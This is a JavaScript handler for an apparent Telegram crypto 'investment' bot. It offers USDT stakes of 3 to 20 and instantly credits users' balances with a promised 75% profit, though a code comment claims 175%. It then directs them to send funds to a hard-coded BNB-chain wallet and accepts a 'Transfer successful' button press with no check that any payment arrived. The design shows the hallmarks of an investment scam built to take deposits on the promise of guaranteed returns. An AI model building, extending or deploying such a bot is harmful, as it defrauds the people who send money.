// investHandler.js
const fs = require("fs");
const { User, Investment } = require("./db"); // Import the Investment model

module.exports = {
  handleInvest: async (ctx) => {
    const keyboard = [
      [
        { text: "3 USDT", callback_data: "invest_3" },
        { text: "5 USDT", callback_data: "invest_5" },
      ],
      [
        { text: "8 USDT", callback_data: "invest_8" },
        { text: "10 USDT", callback_data: "invest_10" },
      ],
      [
        { text: "20 USDT", callback_data: "invest_20" },
        { text: "Back", callback_data: "back" },
      ],
    ];

    ctx.reply("Choose an investment amount:", {
      reply_markup: {
        keyboard: keyboard,
        one_time_keyboard: true,
        resize_keyboard: true,
      },
    });
  },

  handleText: async (ctx, text) => {
    if (["3 USDT", "5 USDT", "8 USDT", "10 USDT", "20 USDT"].includes(text)) {
      const amount = parseInt(text.split(" ")[0]);
      const profitPercentage = 0.75; // 175% profit

      // Calculate the profit amount
      const profitAmount = amount * profitPercentage;

      // Update the user's balance
      const user = await User.findOne({ userId: ctx.from.id });
      user.balance += amount + profitAmount;
      await user.save();
      ctx.replyWithPhoto(
        {
          source: fs.createReadStream("./card.PNG"),
        },
        {
          caption:
            `🚀 **Investment Confirmation**\n\n` +
            `Thank you for choosing to invest **${amount} USDT**! 💰\n\n` +
            `Please send the amount to the following wallet address:\n\n` +
            `🪙 **Wallet Address USDT(BNB)**: 0x730d48fF15bb07179fA45dD21C000193a5e715d1\n\n` +
            `Make sure to double-check the address before sending. ✅\n\n` +
            `If you have any questions or need assistance, feel free to ask! 🤔\n\n` +
            `Happy investing! 🌟`,
        }
      );

      const keyboard = [
        [{ text: "Transfer successful", callback_data: "success" }],
      ];
      ctx.reply(
        "Thanks for your trust. Click the button below once you've completed the transfer:",
        {
          reply_markup: {
            keyboard: keyboard,
            one_time_keyboard: true,
            resize_keyboard: true,
          },
        }
      );

      // Save investment details to MongoDB
      const userId = ctx.from.id; // Assuming user ID from the context
      try {
        await Investment.create({ userId, amount });
        console.log(`Investment of ${amount} USDT saved for user ${userId}`);
      } catch (err) {
        console.error("Error saving investment:", err);
      }
    } else if (text === "Transfer successful") {
      const keyboard = [
        [
          { text: "Balance", callback_data: "balance" },
          { text: "Invest", callback_data: "invest" },
          { text: "Withdraw", callback_data: "withdraw" },
        ],
      ];
      ctx.reply("Transfer successful", {
        reply_markup: {
          keyboard: keyboard,
          one_time_keyboard: true,
          resize_keyboard: true,
        },
      });
    } else if (text === "Back") {
      const keyboard = [
        [
          { text: "Balance", callback_data: "balance" },
          { text: "Invest", callback_data: "invest" },
          { text: "Withdraw", callback_data: "withdraw" },
        ],
      ];
      ctx.reply("Failed", {
        reply_markup: {
          keyboard: keyboard,
          one_time_keyboard: true,
          resize_keyboard: true,
        },
      });
    }
  },
};
